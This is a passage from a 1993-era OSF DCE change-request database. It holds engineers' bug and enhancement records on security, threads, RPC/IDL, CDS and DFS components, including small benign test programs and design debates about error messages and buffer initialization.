          add this account to the registry so that he can subsequently
          override it on his system (Doesn't that make a lot of sense?), 
          but vendors will just have to keep adding more and more, as they
          discover differences with their UNIX implementations. The far
          simpler fix is to permit the password override file to add
          accounts (which will have no network credentials).


	2) Modify the registry database creation code to eliminate the
           pre-existing accounts.

	   This forces every vendor with integrated login to supply an
           override file, which removes any responsibility for this stuff
           from the user/administrator.



CR Number                     : 7619
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cfg
Subcomponent Name             : 
Short Description             : DCE header files C++ unfriendly
Reported Date                 : 3/31/93
Found in Baseline             : 1.0.2b19
Found Date                    : 3/31/93
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/31/93 public]
All DCE header files, and .idl files from which exported headers are
generated, need to add tags to the structures tye typedef, e.g. in 
idlbase.h

  typedef struct {
    unsigned short data_offset;
  } *handle_t;

should be something like

  typedef struct _handle_t {
    unsigned short data_offset;
  } *handle_t;

Without the structure tag it is impossible to use the defined type in
a C++ class that provides a user defined type conversion from the class
to the type, e.g.

  class Binding {
  public:
    ...
    Binding(rpc_binding_handle_t);      // compiler barf!
    ...
    operator rpc_binding_handle_t();
    ...
  }

The following list contains the names of the files that need to be
examined as of 1.0.2b19:

/usr/include/dce/aclbase.h
/usr/include/dce/binding.h
/usr/include/dce/cdsclerk.h
/usr/include/dce/cma.h
/usr/include/dce/cma_defs.h
/usr/include/dce/cma_host.h
/usr/include/dce/cma_px.h
/usr/include/dce/cma_queue.h
/usr/include/dce/conv.h
/usr/include/dce/convc.h
/usr/include/dce/daclif.h
/usr/include/dce/dtsprovider.h
/usr/include/dce/ep.h
/usr/include/dce/exc_handling.h
/usr/include/dce/glb.h
/usr/include/dce/id_base.h
/usr/include/dce/idlbase.h
/usr/include/dce/iovector.h
/usr/include/dce/lbase.h
/usr/include/dce/llb.h
/usr/include/dce/mgmt.h
/usr/include/dce/nbase.h
/usr/include/dce/ndrold.h
/usr/include/dce/passwd.h
/usr/include/dce/prvnbase.h
/usr/include/dce/rdaclif.h
/usr/include/dce/rgynbase.h
/usr/include/dce/rpcbase.h
/usr/include/dce/rpctypes.h
/usr/include/dce/rrpc.h
/usr/include/dce/sec_authn.h
/usr/include/dce/sec_base.h
/usr/include/dce/sec_login.h
/usr/include/dce/sockbase.h
/usr/include/dce/stubbase.h
/usr/include/dce/utc.h
/usr/include/dce/utctypes.h
/usr/include/dce/uuid.h

/usr/include/dce/aclbase.idl
/usr/include/dce/dtsprovider.idl
/usr/include/dce/ep.idl
/usr/include/dce/id_base.idl
/usr/include/dce/iovector.idl
/usr/include/dce/lbase.idl
/usr/include/dce/nbase.idl
/usr/include/dce/ndrold.idl
/usr/include/dce/prvnbase.idl
/usr/include/dce/rgynbase.idl
/usr/include/dce/rpcbase.idl
/usr/include/dce/rpctypes.idl
/usr/include/dce/sec_authn.idl
/usr/include/dce/sec_base.idl
/usr/include/dce/sec_login.idl
/usr/include/dce/utctypes.idl
/usr/include/dce/uuid.idl

[10/01/93 public]
This is an enhancement, and is not going to get fixed for 1.0.3
Changing to a D4 enhancement, defered to 1.1



CR Number                     : 7598
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_admin / initrep
Short Description             : rep API returns ambiguous error msgs on auth errs.
Reported Date                 : 03/25/93
Found in Baseline             : 1.0.2
Found Date                    : 03/25/93
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[03/25/93 public]

If you try to do a sec_admin/initrep command and you are not logged in as
cell_admin you get the following error message:

  Initialize replica operation failed - Registry object not found (dce / sec)

This error message doesn't give you a clue (at least to me since I tried this
many times over several days and kept blaming replication) as to what the real
problem is.  It should say something like "not authorized to perform initrep"
or a facsimile there of.

root@dce9> sec_admin
Default replica:  /.../admin_cell/subsys/dce/sec/master
Default cell:     /.../admin_cell
sec_admin> lrep -all
Default replica:  /.../admin_cell/subsys/dce/sec/master
Default cell:     /.../admin_cell


subsys/dce/sec/loan201_rep
          Instance id: 005bf540-010c-1bb2-b87c-08002b14b1a0
          Addresses:               ncacn_ip_tcp:130.105.201.6[]
                                   ncadg_ip_udp:130.105.201.6[]
          State:                   in service - slave
          Last update received at: Thu Mar 25 16:50:53 1993
          Last update's seqno:     0.212
          Propagation state:       ready for updates
          Last update delivered:   Thu Mar 25 16:50:53 1993
          Last update's seqno:     0.212
          Number of outstanding updates: 0
          Last comm status:        successful completion

subsys/dce/sec/master (master)
          Instance id: 0069a794-fc77-1bb1-a21c-08002b1c9287
          Addresses:               ncacn_ip_tcp:130.105.202.29[]
                                   ncadg_ip_udp:130.105.202.29[]
          State:                   in service - master
          Last update received at: Thu Mar 25 16:50:53 1993
          Last update's seqno:     0.212
sec_admin> initrep subsys/dce/sec/loan201_rep
Do you wish to continue (y[es]) or abort this operation (n[o])? y
Initialize replica operation failed - Registry object not found (dce / sec)
sec_admin>

[4/1/93 public]
This is a cosmetic problem, so I moved it from severity 'B' to 'C'.
It is not a sec_admin problem.  secd itself returns these ambiguous errors
if you don't have the rights to perform the repl operation you attempted.
Changed fixby field to 1.0.3.

[8/2/93 public]

Responsible -> hanfei.

[10/14/93 public]

Converted to enhancement and deferred to 1.1 . "Registry object 
not found" message is going to be fixed as part of the 1.1 Servceability
work. (this message is issued from a lot of places) and this will be
fixed as part of that work.  A specific solution for this particular
instance of the error message is outlined below (thanks to Anne Hopkins).
However, I would like to evaluate all the places where this message
is issued before adopting the solution outlined below. Hence the
reason for deferral to 1.1.

One fix is to add the "r" permission bit to the replist ACL.
This bit is not currently supported. In addition 
an acl entry needs to be created giving read access to  an 
unauthenticated user.

Note that the 'obvious' fix of changing rs_authorized_by_pac() to 
return an unauthorized error message instead of "registry object
not found" when a user has  no access at all is NOT correct since
this creates a security hole since "not authorized" message would be
returned for *every* unauthorized access not just unauthorized access
to the replica list.  This in turn would enable the following 
determination to made :

   sec_rgy_not_authorized -> object exists
   sec_rgy_object_not_found -> object doesn't exist

and allow an unauthorized user to browse the namespace. 

It is pecisely to prevent the unauthorized browsing of the namespace
that the "registry object not found" is returned if the client
has absolutely has no rights and the "not authorized" message if the
client has some rights.

So, by adding the support for an "r" bit in the replist ACL and
creating an entry in the replist ACL allowing an uauthenticated user
read access the "not authorized message" would be issued.



CR Number                     : 7594
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8614
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : Need a general aggregate-import tool
Reported Date                 : 3/25/93
Found in Baseline             : 1.0.2
Found Date                    : 3/25/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : 
Transarc Deltas               : 
Transarc Herder               : 

[3/25/93 public]
This CR is the result of a discussion of the limitations of syncfldb
(see CR 7526). This enhancement request is for a tool that would allow
dfs system administrators to add lfs aggregates to a dfs cell and
maintain the existing filesets on the aggregate. This would be a useful
tool when creating new cells or when moving a lfs aggregate from one
cell to another.
Currently, the only way to add a lfs aggregate and its filesets to a
dfs cell is to:
	- tar together the contents of the filesets on a disk
	- clean it completely with ``newaggr''
	- re-create the filesets with ``fts create'
	- restore the non-ACL contents of the filesets via tar
Some known problems that will be faced by this tools are:
	- cell UUIDs are store in ACLs, therefore tool would have to
	translate arbitrary ACLs OR strip them OR replace them somehow
	- potential fileset id conflicts with existing filesets in the cell
	- potential fileset name conflicts with existing filesets in the cell

[8/27/93 public]
defer -> open - Can this one be addressed in the 1.1 timeframe? Can the
work be done in such a way that a single fileset can be moved from one
cell to another?

[3/29/94 public]
Dup'ing 8618 to this one.  There's extended discussion in OT 8618, so you
might want to refer to it when fixing this.
Filled in Inter-dependent CRs with `8614' 
Changed Priority from `2' to `3' 
Changed Responsible Engr. from `jaffe' to `pakhtar'



CR Number                     : 7508
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : dce_config does not handle DFS admin lists well
Reported Date                 : 3/16/93
Found in Baseline             : 1.0.2
Found Date                    : 3/16/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/16/93 public]
dce_config does not implement DFS admin list administration well.
The main problems are:
 
1 'bos addadmin' requests are always directed to server /.:/hosts/$HOSTNAME
  (the local machine), but there is no guarantee that this machine is the SCM.
 
2 Some admin lists are set up before upclient is configured.  So when
  upclient begins pulling updated lists over, the list updates done before
  upclient was configured are overwritten.
 
3 Most admin lists are treated the same.  admin.fl, admin.ft, and
  admin.up (and admin.bak looks like it will eventually be handled
  the same way) all get two entries added:  user hosts/<scm_machine>/dfs-server
  and group subsys/dce/dfs-admin.  (This latter gets added over and
  over again as each new machine is configured.)  But the DFS docs
  say that admin.up and admin.ft should have entries for the servers
  that will be performing certain actions.
 
I think these sections of dce_config need to be rewritten as such:
 
- If upclient is one of the daemons to be configured, do it first.
  Then, direct each admin list update request to the SCM you just
  configured upclient for.
 
- When configuring ftserver or upclient, add the local machine's 
  principal to admin.ft or admin.up.
 
- Only the SCM has to add group subsys/dce/dfs-admin to the lists.

[05/10/93 public]
Additional info.  Our experience recently has shown:
 
- Any machine running upclient does not need a copy of admin.up.  It should
  be added to the admin.up list, but should not pull that list across the wire.
 
- When adding a new member to any of the lists, add it both on the System
  Control Machine and the local machine.  (It could take the upclient up to
  5 minutes to grab a new copy of the list during which you won't be allowed
  to do the things you want to.  Adding it locally allows you to survive until
  you get the new copy of the official list.)  The exception here is admin.up--
  see the first point in this note.

[4/27/94 public]
 
I would like to fix these problems by removing the automatic config of the
upserver/upclient from the fileserver and fldb config steps.  By default I
would have the fl and ft server configuration routines only initialize a
basic, local admin list.  I would also expand the "DFS System Control
Machine" menu option option to allow the configuration of either an upserver or
upclient.  Thoughts?  If I don't hear any objections by 5/1 I will proceed
with this.

[4/28/94 public]
My gut reaction would be to NOT do that.  My assumption is that most people
would use the distributed lists, so why make them go through multiple steps
to set it up (especially when your first releases had the steps combined)?
 
By the way, before making such a major change, are you checking with 
Transarc first?

[mckeen 4/28/94 public] 
Thanks for your comments Ken, I have added Craig at Transarc to the cc
list.  Are most people using the distributed lists?  I would think that if
they are they are already using something other then dfs_config to set them
up.  As you pointed out when you filed this defect, the list setup in
dfs_config is broken almost to the point of being useless.  My intent was
to setup basic local lists on each of the server machines with the group
dfs-admin in them.  Membership in dfs-admin could then be handled with
rgy_edit and in effect the changes would be seen globaly.  Obviously there
are more complex setups that would necessitate seting up upserver and
upclient, but dfs_config does not handle this now so I would not be taking
any functionality away, just simplifying the base configuration.

[mckeen 8/24/94 public] 

Downgraded to C2.  Since concensus was not reached on the proposed fix
and I have moved onto other higher priority tasks, this will be
defered to 1.2.

[psn 2/6/96 public] 
Transarc should update this OT with appropriate feedback and change
the severity/priority and/or status depending upon what decision they
make.



CR Number                     : 7496
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : 
Short Description             : dce_login should have option to specify ticket lifetime other than default.
Reported Date                 : 3/15/93
Found in Baseline             : 1.0.2
Found Date                    : 3/15/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/15/93 public]

The default certificate lifetime set under properties serves as an
upper bound for TGT lifetime.  It limits the value on the account.
I don't really know if this is a bug in code or if it just isn't explained
well in the documentation.  It seems like the authentication policies
are meant to control upper bounds, so why does the default property
do the same.

So when you use dce_login, your TGT lifetime can be no greater then
the default property lifetime.  If you use kinit, you can by-pass this
by specify a lifetime.

janet

[3/15/93 public]

Not a bug; it's an enhancement request.

dce_login currently always uses the default lifetime; it doesn't provide a
way to specify a lifetime on the command line.

You can deal with this by using dce_login, and then refreshing your tickets
with kinit with the desired lifetime.



CR Number                     : 7495
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : tkc
Short Description             : tkc hoards vnodes
Reported Date                 : 3/15/93
Found in Baseline             : 1.0.2
Found Date                    : 3/15/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : xvfs_vnode.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : 
Transarc Deltas               : 
Transarc Herder               : 

[3/15/93 public]

The token cache retains references to vnodes forever, releasing
vnodes only when token cache entries must be recycled.  There
should be some backpressure mechanism applied by a background
process, so that vnodes referenced by the token cache but not
referenced recently will eventually be returned to the vnode free list.

Currently the number of vcache entries is configured at 96, which
is small relative to the total number of vnodes, but it still makes
sense to return those 96 vnodes to general use if access thru the glue 
is not part of the current usage pattern on the file server.

[3/15/94 public]
Assigned to Mike to determine relevance to small resource effort.



CR Number                     : 7470
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : cma__assert_warn
Short Description             : most, if not all, assertion warnings should be fatal.
Reported Date                 : 3/10/93
Found in Baseline             : 1.0.2
Found Date                    : 3/10/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/10/93 public]

Note that this is an enhancement request for 1.0.3

I have yet to see a CMA "warning" which didn't indicate a fatal error in
either (a) the program calling CMA or (b) CMA itself.  Rather than dying
immediately and either (a) trapping into a debugger or (b) creating a core
dump indicating the immediate point of the error, CMA emits a (tantalizing
but incomplete) warning message and *keeps on going*, destroying most
evidence of where the error actually occurred.

The easiest way to, umm, fix this is to tweak cma__assert_warn to be the
same as cma__assert_fail..

[3/10/93 public]
added dce-ot-sec to interest list.



CR Number                     : 7452
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp command does not have
-confidence option
Reported Date                 : 3/9/93
Found in Baseline             : 1.0.2b17
Found Date                    : 3/9/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/9/93 public]

"set cdscp confidence level" command only works inside CDS control program.
Once cdscp exits, the confidence level is reset back to medium. That means
that all cdscp command executed at command line will always work with
medium confidence.

It will be nice to let command line cdscp command to take "-confidence
level" as an option so that the command is executed with the specified
confidence. 

The requirement comes when people needs to use cdscp commands (lots) at
different places in a shell script. Though there is way to get around this
like: 

cdscp << EOF
set cdscp confidence high
{commands}
EOF

But if one needs to do so for every cdscp command, it would be kind of
clumsy.



CR Number                     : 7409
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : VMM coalescing code is holding priority too high
Reported Date                 : 3/3/93
Found in Baseline             : 1.0.2
Found Date                    : 3/3/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : 

[3/3/93 public]
While looking at 7372, I found that this code uses i_disable(INTMAX) rather
than the more conservative i_disable(INTPAGER) which should be used.
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'

[3/23/93 public]
This doesn't cause a bug, but is rather something of poor form.  Marking as an
enhancement request.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `bwl' to `ota' 
Changed Responsible Engr. from `mason@transarc.com' to `bwl@transarc.com'



CR Number                     : 7396
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : dce_config should sanity check /.:/sec being populated.
Reported Date                 : 3/2/93
Found in Baseline             : 1.0.2
Found Date                    : 3/2/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/2/93 public]

note that this is an *enhancement* request.

I've noticed that dce_config doesn't require /.:/sec (which is created by
secd) to be populated.

This means that errors may not be detected until well after a cell config
is complete.

After the cds server config is complete, it should run a rpccp import -i
<xxx> /.:/sec and sanity check the output to make sure that the name is
registered correctly and can be imported.



CR Number                     : 7394
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cm
Short Description             : no support for device spec files
Reported Date                 : 3/2/93
Found in Baseline             : 1.0.2
Found Date                    : 3/2/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : 

[3/2/93 public]
The CM needs to support transparent access to device special files
which are looked up by the CM.  i.e. /.../mycell/fs/dev/null is
not just another file.  There is some vestigial support in osi_MakeDev()
and cm_MakeDev(), but only for AFS_VFS40.  The CM lookup vnode operation
also needs to call the kernel specvp() routine somewhere.

[3/3/93 public]
This issue has come up (multiple times) of late.  It really is an
enhancement request.  While on this subject, you should note the
recent bug opened noting that you cannot dump/restore device files,
either.
I'll assign to kazar; the CC list is long because we do, at some
point, have to address this issue.
Changed Defect or Enhancement? from `def' to `enh' 
Filled in Interest List CC with `mason,cfe,tu,ota,pakhtar' 
Changed Responsible Engr. from `mason' to `kazar' 
Added field Transarc Deltas with value `' 
Added field Transarc Status with value `open'



CR Number                     : 7363
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : System-dependent VOP_SETATTR() setup done in "portable" code
Reported Date                 : 2/25/93
Found in Baseline             : 1.0.2
Found Date                    : 2/25/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : 
Transarc Deltas               : 
Transarc Herder               : 

[2/25/93 public]
This difficulty was encountered in testing the OSF/1 volops code.  Both
the fts restore code and (less importantly) volclient try to guess what
fields in a vattr struct cannot be set by the local VOP_SETATTR
operation, and disable these fields before making a VOLOP_SETATTR
call.  This doesn't work well when they guess wrong (as was the case
under OSF/1).
Craig Everhart suggests that the disabling of vattr fields be left to
system-specific VOLOP_SETATTR code, which can be customized to fit each
platform.  The OSF/1 VOLOP_SETATTR implementation has already been
changed to disable exactly the fields that VOP_SETATTR can't alter.
The same change should be made to the RIOS VOLOP_SETATTR, and the
non-portable disabling of vattr fields should be removed from fts
restore and volclient.

[3/15/93 public]
Filled in Interest List CC with `cfe@transarc.com, pakhtar@transarc.com' 
Changed Responsible Engr. from `pakhtar@transarc.com' to `jdp@transarc.com' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 7345
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : uninitialized output arguments can cause security hole
Reported Date                 : 2/24/93
Found in Baseline             : 1.0.2
Found Date                    : 2/24/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/93 public]

Note that this is an *enhancement* request.

Because DCE security uses encryption, all DCE services must wind up
keeping secrets.

Currently, IDL server stubs do not initialize the buffers for output
arguments before calling into the manager; they thus get whatever "stack
garbage" happens to be there.

That stack garbage *could* contain encryption keys or other non-public
information; an attacker could possibly use this to penetrate the service
or any other it shared a key with.

Rather than requiring all DCE services to zero output arguments before
returning from a manager routine, it seems to me to make much more sense
from a security standpoint to have the stubs call memset(&arg, 0,
sizeof(arg)) on *all* output-only arguments prior to entering the manager
routine.

Alternatively, they could call memset(&arg, 0xe5,sizeof(arg)) or otherwise
initialize the values to something "obviously wrong" (my personal favorites
in this space are hex "words" like "0xdeadbeef" or "0xeffaced").

[7/8/93 public]

This is an inappropriate request. If application code fails to null out
data which could be sensitive this is an error in the application code.
The requested change would affect the performance of all RPC applications
and is undesirable for this reason.

[7/8/93 public]

I reopen and amend my request to ask for an ACF option to turn on this
behavior on a per-interface basis.

We would enable this for all interfaces used by the security server.

[8/27/93 public]

(I tried to clean up some of the comments above, hopefully I didn't make
it worse....)

I don't get it.  Are you worried about attackers from within your own 
process?  Even if you did NULL out all of the arguments sent to a manager
routine, that doesn't prevent the manager routine from climbing up the
stack, or rummaging through memory that doesn't "belong" to it, and finding
other non-public information.



CR Number                     : 7322
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : use of wrong error codes
Reported Date                 : 2/23/93
Found in Baseline             : 1.0.2
Found Date                    : 2/23/93
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/23/93 public]
Looking at CR 6451 I noticed something was wrong.  The component name being 
used in the error messages is `thd', and it should be `thr'.  The later is
the official abbreviation of the component name.

What does this mean?  It probably means that the current error codes for
the threads component are wrong (since we encode the component name in the
error code).  Taking a brief look at the code I saw that CMA has it's own
cma_error_inq_text which seems to do basically the same thing as
dce_error_inq_text in src/rpc/runtime/dce_error.c.  CMA should really just
use the dce routine (perhaps there is an issue here that it should be moved
from libnck.a to a libdceutils.a perhaps this is a 1.1 thing).

Below is the note from CR 6451 that I saw this in:

  Using nightly build available today (on amigo), and a dce_config altered to
  NOT start sec_clientd (known problem - see OT 6448), I cannot configure
  an initial cds server on pmax:
  
	  Add CDS registry entries
  Current site is: registry server at /.../dfs_cell 
  Domain changed to: principal
  Domain changed to: account
  Exception: Invalid memory address (dce / thd)
  config_basecds[3]: 953 Resources lost
	  Creating the cds.conf file...
	  Starting cdsadv ...
  Exception: Invalid memory address (dce / thd)
  cdsadv failed to start
	  Press <ENTER> to continue or CTRL-C to exit

[8/20/93]
Changing threads to use the DCE routine is planned for 1.1. For now, it
is sufficient to change the encoding of the 3-char component name 
abbreviation. This is done in exc_handling.h in the _EXC_DCE_PREFIX_
constant. The new value is 0x177e9000, where "thr" is encoded in the 
"77e9" part, and the "1" is used to differentiate dce codes from 
errno values. The "000" are placeholders which offset the values. 
The algorithm for creating the value is:
        ((((char1 - 'a') * 40 + (char2 - 'a')) * 40) + (char1 - 'a'))
or	(((('t'   - 'a') * 40 + ('h'   - 'a')) * 40) + ('r'   - 'a'))
	((((19         ) * 40 + (7          )) * 40) + (17         ))

nitro 942 % dc
19 40 * 7 + 40 * 17 + p
30697
q

produces the value in decimal. Converted to hex, it is 0x77e9, and
don't forget to add in the top "1". To test the value  0x77e9, compile
and run the following program (note that it is really in RAD-40, not 
RAD-50):

-- cut --
#include        <stdio.h>
#include        <stdlib.h>
#include        <string.h>

main( int argc, char *argv[] )

{
        int i;
        long code;
        unsigned char name[6];

        if (argc < 2)
        {
            fprintf(stderr, "usage: %s <hexidecimal_number>\n",
                argv[0] );
            exit(1);
        }

        for (i = 0; i < sizeof(name); i++)
                name[i] = '\0';

        i = 1;
        sscanf( argv[i], "%x", &code );
        printf( "decimal representation of code is %d.\n", code);

        /*
         * Convert component name from RAD-50 component code.  (Mapping is:
         * 0 => 'a', ..., 25 => 'z', 26 => '{', 27 => '0', ..., 36 => '9'.)
         */

        name[3] = 0;
        name[2] = code % 40;
        code /= 40;
        name[1] = code % 40;
        name[0] = code / 40;

        for (i = 0; i < 3; i++)
        {
            name[i] += (name[i] <= 26) ? 'a' : ('0' - 27);
        }

        printf("encoded name is \"%s\"\n", name);

}
-- cut --

nitro 945 % rad50_toascii 0x77e9 
decimal representation of code is 30697.
encoded name is "thr"

[9/7/93]
Because of unresolved backwards compatibility issues, this bug is being 
deferred to DCE 1.1.



CR Number                     : 7319
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : login context typedef of "void *" is error prone.
Reported Date                 : 2/22/93
Found in Baseline             : 1.0
Found Date                    : 2/22/93
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/22/93 public]

There is a lot of casting going on in security between "abstract void *"
types (specifically, sec_login_handle_t and sec_rgy_handle_t) and their
"implementation types".

Because C does (most) type equivalence by structure rather than name, this
is incredibly error prone; bug 7248 was mostly caused by the explicit
flaunting of the C type system -- a sec_rgy_handle_t was used instead of a
sec_login_handle_t, with disastrous results.

The ideal fix would be to just typedef them to a pointer to an otherwise
"unknown" structure (and only define it in the context of the modules which
see the internals of the structure.  Unfortunately, idl doesn't let you do
that -- it complains, even in a [local] interface, if you attempt to
typedef something to a pointer to an unknown type.

Alternatively, we can define a "dummy" structure in the .idl files, and
typedef to that, and get *most* of the benefits of the typechecking.

[02/23/93 public]
Defining a dummy structure is a bad idea; casting (struct foo *) to
(struct bar *) is not as safe and portable as casting (void *) to
(struct bar *).  So much so that I would rather see the current bug-prone
situation left as-is then to make this fix.  I totally agree that the
right thing to do is fix IDL, as requested in 7320.
	/r$



CR Number                     : 7314
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : cma_mutex.c
Short Description             : thread_mutex_unlock() did not
return an ownership error when attempting to unlock a mutex owned by another thread
Reported Date                 : 2/22/93
Found in Baseline             : 1.0.1
Found Date                    : 2/22/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/22/93 public]

Full Description:

        The function does not complain if invoked with a mutex which is
currently locked by another thread. Seems like this could lead to very
hard to debug problems if this goes undected. The man page for the function
indicates the behavior is unpredictable. Seems like this should be an
error which is deteced.

	If one goes to build cma without defining NDEBUG, he at least get a
warning. But it is said that normally threads package is built with NDEBUG 
defined.

	Here is a short sample program.

#include <pthread.h>
#include <cma_errno.h>

static pthread_t        thread;

pthread_mutex_t     mutex;

static void
my_thread
#ifdef _CMA_PROTO_
        (int thd_id)
#else
        (thd_id)
        int     thd_id;
#endif
    {
    int                 status;

    status = pthread_mutex_lock (&mutex);

    }

int
main
#ifdef _CMA_PROTO_
        (int argc, char *argv[], char *envp[])
#else   /* no prototypes */
        (argc, argv, envp)
        int     argc;
        char    *argv[];
        char    *envp[];
#endif  /* prototype */
    {
    int i, status;

    status = pthread_mutex_init (&mutex, pthread_mutexattr_default);

    status = pthread_create (
        &thread,
        pthread_attr_default,
        (pthread_startroutine_t)my_thread,
        (pthread_addr_t)i);

    pthread_yield();

    status = 0;

    status = pthread_mutex_unlock (&mutex);

    if (!status)
    {
      printf("pthread_mutex_unlock() OK\n");
    }
    else
    {
      printf("status = %d, errno = %d\n", status, errno);
      printf("pthread_mutex_unlock() returned error\n");
    }

}



CR Number                     : 7287
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : name cache
Short Description             : Shouldn't be using export_context to get creds name for name_cache
Reported Date                 : 2/18/93
Found in Baseline             : 1.0.2
Found Date                    : 2/18/93
Severity                      : C
